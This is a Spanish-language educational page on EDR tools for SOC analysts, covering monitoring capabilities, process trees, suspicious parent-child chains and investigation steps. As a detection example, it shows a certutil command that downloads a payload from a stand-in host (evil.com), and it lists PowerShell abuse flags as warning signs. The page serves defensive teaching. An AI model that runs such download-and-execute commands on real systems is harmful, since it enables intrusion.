---
icon: shield-halved
---

# EDR — Detección y Respuesta de Endpoints

**EDR** (Endpoint Detection and Response) es un agente instalado en cada endpoint (PC, servidor, portátil) que monitoriza y registra en tiempo real todo lo que ocurre en el sistema: procesos, conexiones de red, operaciones de archivos, cambios de registro y más.

|                 | Antivirus tradicional       | EDR                                     |
| --------------- | --------------------------- | --------------------------------------- |
| **Detección**   | Malware conocido por firmas | Comportamiento anómalo                  |
| **Enfoque**     | Reactivo                    | Proactivo                               |
| **0-days**      | No detecta                  | Puede detectar por comportamiento       |
| **Visibilidad** | Limitada al archivo         | Todo el sistema                         |
| **Respuesta**   | Cuarentena del archivo      | Aislar endpoint, matar proceso, hunting |

### Capacidades del EDR

#### Visibilidad

El EDR registra y hace disponible para el analista:

* **Procesos** — nombre, PID, ruta, argumentos, usuario que lo ejecutó, hash del ejecutable, línea de comandos completa
* **Árbol de procesos** — relación padre-hijo entre procesos
* **Conexiones de red por proceso** — qué proceso hizo qué conexión, IP/puerto origen y destino
* **Operaciones de archivos** — archivos creados, modificados, eliminados o renombrados, y por qué proceso
* **Modificaciones del registro** (Windows) — especialmente en rutas de persistencia
* **Carga de DLLs** — para detectar DLL hijacking

#### Respuesta activa

Desde la consola del EDR el analista puede:

* **Aislar el endpoint** — corta todas las conexiones de red pero mantiene la conexión con el servidor del EDR, permitiendo seguir investigando
* **Poner archivo en cuarentena** — el archivo malicioso se mueve a una zona segura sin posibilidad de ejecución
* **Matar un proceso** — terminar inmediatamente un proceso malicioso en ejecución
* **Live Response / Remote Shell** — acceso interactivo al endpoint comprometido sin estar físicamente presente

#### Hunting masivo

El EDR permite buscar un IOC en **todos los endpoints a la vez**. Si el analista detecta un C2 en un sistema, puede buscar en segundos si otros equipos también se comunicaron con esa IP — revelando posible movimiento lateral.

### El árbol de procesos

El árbol de procesos es la visualización más importante del EDR. Muestra la jerarquía padre-hijo y es la forma más rápida de detectar comportamiento malicioso.

#### Árbol de procesos normal (Windows)

```
System
└── smss.exe
    └── wininit.exe
        ├── services.exe
        │   ├── svchost.exe -k netsvcs
        │   └── svchost.exe -k LocalService
        └── lsass.exe

winlogon.exe → userinit.exe → explorer.exe
                               ├── chrome.exe
                               └── outlook.exe
```

#### Árboles sospechosos — ejemplos reales

**Macro maliciosa en Word (phishing):**

```
WINWORD.EXE                   ← usuario abrió un documento
└── cmd.exe                   ← Word NO debería lanzar cmd.exe
    └── powershell.exe        ← cmd NO debería lanzar PowerShell
        └── net.exe           ← reconocimiento de la red
```

**Descarga y ejecución de payload:**

```
chrome.exe
└── cmd.exe                   ← navegador NO debería lanzar cmd
    └── certutil.exe -urlcache -f http://evil.com/payload.exe
        └── payload.exe       ← ejecución del malware descargado
```

**PsExec — movimiento lateral:**

```
services.exe
└── PSEXESVC.exe              ← servicio instalado por PsExec
    └── cmd.exe               ← shell en el sistema remoto
        └── whoami            ← el atacante verifica acceso
```

### Procesos legítimos de Windows — señales de compromiso

| Proceso          | Padre esperado | Señales de alerta                                                                                                               |
| ---------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `lsass.exe`      | `wininit.exe`  | Más de una instancia, padre diferente, ruta diferente. Los atacantes hacen dump para robar credenciales.                        |
| `svchost.exe`    | `services.exe` | Sin parámetro `-k`, padre diferente, ruta diferente. El más imitado por malware.                                                |
| `explorer.exe`   | `userinit.exe` | Conexiones de red inusuales, hijo de proceso raro.                                                                              |
| `powershell.exe` | Variable       | Ejecutado desde Office/navegador/svchost, argumentos con `-EncodedCommand`, `-ExecutionPolicy Bypass`, `IEX`, `DownloadString`. |

### Cómo usa el analista el EDR en una investigación

1. El SIEM genera una alerta → el analista la toma y va al EDR
2. Busca el endpoint afectado y ve el **árbol de procesos** alrededor del timestamp
3. Identifica qué proceso generó el evento y quién lo lanzó
4. Revisa las **conexiones de red** de ese proceso — ¿conectó a una IP externa?
5. Revisa las **operaciones de archivos** — ¿creó ejecutables? ¿cifró archivos?
6. Busca el **hash del ejecutable** sospechoso en VirusTotal
7. Si es amenaza confirmada: **aislar el endpoint** desde el EDR y escalar

### Soluciones EDR principales

| EDR                                 | Características                                                                |
| ----------------------------------- | ------------------------------------------------------------------------------ |
| **CrowdStrike Falcon**              | Líder del mercado, cloud-native, excelente hunting con FQL                     |
| **SentinelOne**                     | IA para detección autónoma, rollback automático ante ransomware                |
| **Microsoft Defender for Endpoint** | Integrado en Windows, excelente integración con Sentinel y Azure               |
| **Elastic EDR**                     | Open source en versión básica, integrado con Kibana                            |
| **Wazuh**                           | 100% gratuito, agentes para Windows/Linux/macOS, integración con MITRE ATT\&CK |

> El **árbol de procesos** es la primera cosa que mirar en el EDR cuando se investiga un endpoint comprometido. La cadena padre → hijo revela inmediatamente si la ejecución es legítima o maliciosa.

> Un EDR solo es tan bueno como su **cobertura de despliegue**. Si hay endpoints sin agente (sistemas legacy, IoT, OT), son puntos ciegos donde el malware puede operar sin ser detectado. El inventario de activos y la cobertura del EDR son una prioridad del ingeniero de seguridad SOC.
